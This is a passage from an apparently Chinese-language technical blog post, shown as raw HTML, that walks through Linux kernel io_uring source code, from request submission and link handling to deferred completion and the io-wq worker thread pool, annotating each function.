class="number">1</span>;</span><br><span class="line">*sqe = &amp;ctx-&gt;sq_sqes[head];</span><br><span class="line"><span class="comment">// 从 sq_sqes 取一个sqe </span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="io-submit-sqe-同步与异步的请求执行"><code>io_submit_sqe</code> | 同步与异步的请求执行</h3><p>我们首先回到 <code>io_submit_sqe</code></p><p>我们注意到, 如果存在 LINK 标记, 只是将这个req添加到链上,  而没有 <code>io_queue_sqe</code>.</p><p>如果前一个请求有 LINK 标记, 此时没有, 也只是将请求加入链中后, 清空 head.  此时调用的是 <code>io_queue_sqe(NULL)</code></p><p>综上, 对于link, 并没有直接处理.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unlikely(link-&gt;head)) &#123;</span><br><span class="line"><span class="comment">// 如果链表已经有了一个head 请求, 意味着之前sqe 有 `IOSQE_IO_LINK` 标志</span></span><br><span class="line">ret = io_req_prep_async(req);</span><br><span class="line"><span class="comment">// 准备异步提交状态</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(ret))</span><br><span class="line"><span class="keyword">return</span> io_submit_fail_init(sqe, req, ret);</span><br><span class="line"></span><br><span class="line">trace_io_uring_link(req, link-&gt;head);</span><br><span class="line">link-&gt;last-&gt;link = req;</span><br><span class="line">link-&gt;last = req;</span><br><span class="line"><span class="comment">// 将本项挂载到链表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; IO_REQ_LINK_FLAGS)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 如果此项没有 LINK 标志, 清空 链表</span></span><br><span class="line"><span class="comment">/* last request of the link, flush it */</span></span><br><span class="line">req = link-&gt;head;</span><br><span class="line">link-&gt;head = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; (REQ_F_FORCE_ASYNC | REQ_F_FAIL))</span><br><span class="line"><span class="keyword">goto</span> fallback;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely(req-&gt;flags &amp; (IO_REQ_LINK_FLAGS |</span><br><span class="line">  REQ_F_FORCE_ASYNC | REQ_F_FAIL))) &#123;</span><br><span class="line"><span class="comment">// 如果之前的任务没有LINK 标记, 但此任务有, 给链表添加一个头</span></span><br><span class="line"><span class="keyword">if</span> (req-&gt;flags &amp; IO_REQ_LINK_FLAGS) &#123;</span><br><span class="line">link-&gt;head = req;</span><br><span class="line">link-&gt;last = req;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fallback:  </span><br><span class="line"><span class="comment">// 加入降级提交fallback队列</span></span><br><span class="line">io_queue_sqe_fallback(req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 加入普通提交队列</span></span><br><span class="line">io_queue_sqe(req);</span><br></pre></td></tr></table></figure><p>再次重回 <code>io_queue_sqe</code> 函数, 我们发现其在调用  <code>io_issue_sqe</code> 时设置了这样两个标志  <code>IO_URING_F_NONBLOCK|IO_URING_F_COMPLETE_DEFER</code>, 字面意义上理解, 就是非阻塞与延迟完成.</p><p>首先为什么要非阻塞呢?</p><p>让我们往前回想, 发现, 在 IOPOLL 模式下,  <code>io_uring_enter</code> 也是调用了 <code>io_submit_sqes</code> , 最终也会调用到此函数, 所以如果这个函数阻塞了, IOPOLL模式下, 用户进程实际上也是阻塞的, 也就不符合异步的初衷了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">io_queue_sqe</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;req-&gt;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">ret = io_issue_sqe(req, IO_URING_F_NONBLOCK|IO_URING_F_COMPLETE_DEFER);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We async punt it if the file wasn&#x27;t marked NOWAIT, or if the file</span></span><br><span class="line"><span class="comment"> * doesn&#x27;t support non-blocking read/write attempts</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (likely(!ret))</span><br><span class="line">io_arm_ltimeout(req);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">io_queue_async(req, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来再进入 <code>io_issue_sqe</code> , 其中使用了一个虚表调用处理函数, 并且之前的flag也作为参数传入了.</p><p>而我们知道, 如read, write等很多操作, 都是阻塞的, 不能 <code>NOBLOCK</code>  , 因此, 这个执行只是一个尝试执行, 实际上并没有真正完成请求</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = def-&gt;issue(req, issue_flags);</span><br><span class="line"><span class="comment">// 调用def-&gt;issue执行请求</span></span><br></pre></td></tr></table></figure><p>接下来我们注意到, 在 <code>io_queue_sqe</code> 调用此函数时, 设置了 <code>IO_URING_F_COMPLETE_DEFER</code> 标志</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ret == IOU_OK) &#123;</span><br><span class="line"><span class="keyword">if</span> (issue_flags &amp; IO_URING_F_COMPLETE_DEFER)</span><br><span class="line"><span class="comment">// 如果成功并且标记了延迟完成,注册延迟完成回调</span></span><br><span class="line">io_req_complete_defer(req);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">io_req_complete_post(req, issue_flags);</span><br><span class="line"><span class="comment">//  否则直接提交完成 </span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ret != IOU_ISSUE_SKIP_COMPLETE)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br></pre></td></tr></table></figure><p>继续进入 <code>io_req_complete_defer</code>  发现实际上就是将请求插入插入链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">io_req_complete_defer</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;req-&gt;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_submit_state</span> *<span class="title">state</span> =</span> &amp;req-&gt;ctx-&gt;submit_state;</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(&amp;req-&gt;ctx-&gt;uring_lock);</span><br><span class="line"></span><br><span class="line">wq_list_add_tail(&amp;req-&gt;comp_list, &amp;state-&gt;compl_reqs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这也没有完成请求.</p><p>那么真正完成请求是在哪? 让我们继续分析</p><h4 id="io-queue-async"><code>io_queue_async</code></h4><p>在 <code>io_issue_sqe</code>  返回后,  <code>io_queue_sqe</code> 继续调用了此函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">io_queue_async</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req, <span class="type">int</span> ret)</span></span><br><span class="line">__<span class="title function_">must_hold</span><span class="params">(&amp;req-&gt;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_kiocb</span> *<span class="title">linked_timeout</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret != -EAGAIN || (req-&gt;flags &amp; REQ_F_NOWAIT)) &#123;</span><br><span class="line">io_req_defer_failed(req, ret);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="comment">// 如果请求是不可等待的必须立马完成的, 就不能推迟</span></span><br><span class="line"></span><br><span class="line">linked_timeout = io_prep_linked_timeout(req);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (io_arm_poll_handler(req, <span class="number">0</span>)) &#123;</span><br><span class="line"><span class="comment">// 这里调用了一个 论询问 handler, 确定 请求的类型</span></span><br><span class="line"><span class="keyword">case</span> IO_APOLL_READY:</span><br><span class="line"><span class="comment">// 如果已经可以完成了</span></span><br><span class="line">io_kbuf_recycle(req, <span class="number">0</span>);</span><br><span class="line">io_req_task_queue(req);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> IO_APOLL_ABORTED:</span><br><span class="line"><span class="comment">// 如果终止了</span></span><br><span class="line">io_kbuf_recycle(req, <span class="number">0</span>);</span><br><span class="line">io_queue_iowq(req, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> IO_APOLL_OK:</span><br><span class="line"><span class="comment">// 如果已经完成了</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (linked_timeout)</span><br><span class="line">io_queue_linked_timeout(linked_timeout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要到, 当为 <code>IO_APOLL_ABORTED</code> 时,  调用了 <code>io_queue_iowq</code></p><p>这里先介绍一下 kernel <a href="https://docs.kernel.org/core-api/workqueue.html">work queue</a> 机制,  workqueue 是一个内核线程池, 当有任务来时, 就从线程池中寻找一个线程运行, 这里就是将请求放入线程池的队列中</p><p>这里可能会有读者有疑问, 那线程池是什么时候创建的呢? 其实是在被笔者跳过的 <code>ctx</code> 的创建过程中// #TODO  由于过于繁杂, 笔者暂时没有分析</p><h3 id="io-queue-iowq-任务处理线程池"><code>io_queue_iowq</code> | 任务处理线程池</h3><p>这一部分也比较重要, 首先是 <code>io_prep_async_link(req)</code>  , 为在一条链上的请求创建 work 结构, 用来放入队列中, 并且 通过  <code>io_wq_enqueue</code> 将其加入线程池队列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">io_queue_iowq</span><span class="params">(<span class="keyword">struct</span> io_kiocb *req, <span class="keyword">struct</span> io_tw_state *ts_dont_use)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_kiocb</span> *<span class="title">link</span> =</span> io_prep_linked_timeout(req);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span> *<span class="title">tctx</span> =</span> req-&gt;task-&gt;io_uring;</span><br><span class="line"></span><br><span class="line">BUG_ON(!tctx);</span><br><span class="line">BUG_ON(!tctx-&gt;io_wq);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* init -&gt;work of the whole link before punting */</span></span><br><span class="line">io_prep_async_link(req);</span><br><span class="line"><span class="comment">// 为链少的每一个 req 准备work结构</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Not expected to happen, but if we do have a bug where this _can_</span></span><br><span class="line"><span class="comment"> * happen, catch it here and ensure the request is marked as</span></span><br><span class="line"><span class="comment"> * canceled. That will make io-wq go through the usual work cancel</span></span><br><span class="line"><span class="comment"> * procedure rather than attempt to run this request (or create a new</span></span><br><span class="line"><span class="comment"> * worker for it).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(!same_thread_group(req-&gt;task, current)))</span><br><span class="line">req-&gt;work.flags |= IO_WQ_WORK_CANCEL;</span><br><span class="line"></span><br><span class="line">trace_io_uring_queue_async_work(req, io_wq_is_hashed(&amp;req-&gt;work));</span><br><span class="line">io_wq_enqueue(tctx-&gt;io_wq, &amp;req-&gt;work);</span><br><span class="line"><span class="keyword">if</span> (link)</span><br><span class="line">io_queue_linked_timeout(link);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么要用work结构而不是 <code>io_kiocb</code> 结构呢, work结构是 <code>io_kiocb</code> 的一个成员, 通过指针减去偏移就可以得到 <code>io_kiocb</code> 的指针, 与此通过, 由于work结构更小, 创建临时结构体时占用空间更小</p><h4 id="io-wq-enqueue"><code>io_wq_enqueue</code></h4><p><code>io_wq_enqueue</code>  是将任务加入 <code>io_wq</code> 线程池的任务队列中.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">io_wq_enqueue</span><span class="params">(<span class="keyword">struct</span> io_wq *wq, <span class="keyword">struct</span> io_wq_work *work)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_acct</span> *<span class="title">acct</span> =</span> io_work_get_acct(wq, work);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_cb_cancel_data</span> <span class="title">match</span>;</span></span><br><span class="line"><span class="type">unsigned</span> work_flags = work-&gt;flags;</span><br><span class="line"><span class="type">bool</span> do_create;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If io-wq is exiting for this task, or if the request has explicitly</span></span><br><span class="line"><span class="comment"> * been marked as one that should not get executed, cancel it here.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state) ||</span><br><span class="line">    (work-&gt;flags &amp; IO_WQ_WORK_CANCEL)) &#123;</span><br><span class="line">io_run_cancel(work, wq);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果需要取消 work  </span></span><br><span class="line">raw_spin_lock(&amp;acct-&gt;lock);</span><br><span class="line">io_wq_insert_work(wq, work);</span><br><span class="line">clear_bit(IO_ACCT_STALLED_BIT, &amp;acct-&gt;flags);</span><br><span class="line">raw_spin_unlock(&amp;acct-&gt;lock);</span><br><span class="line"></span><br><span class="line">rcu_read_lock();</span><br><span class="line">do_create = !io_wq_activate_free_worker(wq, acct);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="comment">// 是否需要创建worker</span></span><br><span class="line"><span class="keyword">if</span> (do_create &amp;&amp; ((work_flags &amp; IO_WQ_WORK_CONCURRENT) ||</span><br><span class="line">    !<span class="type">atomic_read</span>(&amp;acct-&gt;nr_running))) &#123;</span><br><span class="line"><span class="type">bool</span> did_create;</span><br><span class="line"></span><br><span class="line">did_create = io_wq_create_worker(wq, acct);</span><br><span class="line"><span class="comment">// 创建worker</span></span><br><span class="line"><span class="keyword">if</span> (likely(did_create))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="comment">// 如果已经创建了, 直接返回</span></span><br><span class="line">raw_spin_lock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="keyword">if</span> (acct-&gt;nr_workers) &#123;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fatal condition, failed to create the first worker */</span></span><br><span class="line">match.fn= io_wq_work_match_item,</span><br><span class="line">match.data= work,</span><br><span class="line">match.cancel_all= <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">io_acct_cancel_pending_work(wq, acct, &amp;match);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上调用了 <code>io_wq_create_worker</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">io_wq_create_worker</span><span class="params">(<span class="keyword">struct</span> io_wq *wq, <span class="keyword">struct</span> io_wq_acct *acct)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!acct-&gt;max_workers))</span><br><span class="line">pr_warn_once(<span class="string">&quot;io-wq is not configured for unbound workers&quot;</span>);</span><br><span class="line"></span><br><span class="line">raw_spin_lock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="keyword">if</span> (acct-&gt;nr_workers &gt;= acct-&gt;max_workers) &#123;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果已经有上限个 worker了</span></span><br><span class="line"><span class="comment">// 直接返回</span></span><br><span class="line"></span><br><span class="line">acct-&gt;nr_workers++;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="type">atomic_inc</span>(&amp;acct-&gt;nr_running);</span><br><span class="line"><span class="type">atomic_inc</span>(&amp;wq-&gt;worker_refs);</span><br><span class="line"><span class="keyword">return</span> create_io_worker(wq, acct-&gt;index);</span><br><span class="line"><span class="comment">// 创建一个新worker</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="create-io-worker-worker处理线程的创建"><code>create_io_worker</code>  |  worker处理线程的创建</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">create_io_worker</span><span class="params">(<span class="keyword">struct</span> io_wq *wq, <span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_acct</span> *<span class="title">acct</span> =</span> &amp;wq-&gt;acct[index];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_worker</span> *<span class="title">worker</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line"></span><br><span class="line">__set_current_state(TASK_RUNNING);</span><br><span class="line"></span><br><span class="line">worker = kzalloc(<span class="keyword">sizeof</span>(*worker), GFP_KERNEL);</span><br><span class="line"><span class="comment">// 为work分配了空间</span></span><br><span class="line"><span class="keyword">if</span> (!worker) &#123;</span><br><span class="line">fail:</span><br><span class="line"><span class="type">atomic_dec</span>(&amp;acct-&gt;nr_running);</span><br><span class="line">raw_spin_lock(&amp;wq-&gt;lock);</span><br><span class="line">acct-&gt;nr_workers--;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line">io_worker_ref_put(wq);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">refcount_set(&amp;worker-&gt;ref, <span class="number">1</span>);</span><br><span class="line">worker-&gt;wq = wq;</span><br><span class="line">raw_spin_lock_init(&amp;worker-&gt;lock);</span><br><span class="line">init_completion(&amp;worker-&gt;ref_done);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (index == IO_WQ_ACCT_BOUND)</span><br><span class="line">worker-&gt;flags |= IO_WORKER_F_BOUND;</span><br><span class="line"></span><br><span class="line">tsk = create_io_thread(io_wq_worker, worker, NUMA_NO_NODE);</span><br><span class="line"><span class="comment">// 创建处理线程</span></span><br><span class="line"><span class="keyword">if</span> (!IS_ERR(tsk)) &#123;</span><br><span class="line">io_init_new_worker(wq, worker, tsk);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!io_should_retry_thread(PTR_ERR(tsk))) &#123;</span><br><span class="line">kfree(worker);</span><br><span class="line"><span class="keyword">goto</span> fail;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">INIT_WORK(&amp;worker-&gt;work, io_workqueue_create);</span><br><span class="line">schedule_work(&amp;worker-&gt;work);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="io-wq-worker-内核任务线程"><code>io_wq_worker</code>  | 内核任务线程</h4><p>此线程就是线程池中worker的基本单元, 也是真正的异步io处理线程, 其通过自旋锁来阻塞进程, 直到有 work 需要完成.</p><p>中间一大段是和线程调度相关的代码, 包括设置信号处理之类的代码, 由于并不是当前分析的重点, 这里笔者就先跳过了.</p><p>最终, 是调用了 <code>io_worker_handle_work</code>  来处理任务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_wq_worker</span><span class="params">(<span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_worker</span> *<span class="title">worker</span> =</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_acct</span> *<span class="title">acct</span> =</span> io_wq_get_acct(worker);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq</span> *<span class="title">wq</span> =</span> worker-&gt;wq;</span><br><span class="line"><span class="type">bool</span> exit_mask = <span class="literal">false</span>, last_timeout = <span class="literal">false</span>;</span><br><span class="line"><span class="type">char</span> buf[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line">worker-&gt;flags |= (IO_WORKER_F_UP | IO_WORKER_F_RUNNING);</span><br><span class="line"></span><br><span class="line"><span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">&quot;iou-wrk-%d&quot;</span>, wq-&gt;task-&gt;pid);</span><br><span class="line">set_task_comm(current, buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!test_bit(IO_WQ_BIT_EXIT, &amp;wq-&gt;state)) &#123;</span><br><span class="line"><span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (io_acct_run_queue(acct))</span><br><span class="line">io_worker_handle_work(acct, worker);</span><br><span class="line"><span class="comment">// 轮询  </span></span><br><span class="line"><span class="comment">// 如果存在需要完成的work </span></span><br><span class="line"><span class="comment">// io_acct_run_queue 就能持有 acct-&gt;lock 返回</span></span><br><span class="line">raw_spin_lock(&amp;wq-&gt;lock);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Last sleep timed out. Exit if we&#x27;re not the last worker,</span></span><br><span class="line"><span class="comment"> * or if someone modified our affinity.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (last_timeout &amp;&amp; (exit_mask || acct-&gt;nr_workers &gt; <span class="number">1</span>)) &#123;</span><br><span class="line">acct-&gt;nr_workers--;</span><br><span class="line">raw_spin_unlock(&amp;wq-&gt;lock);</span><br><span class="line">__set_current_state(TASK_RUNNING);</span><br><span class="line"><span 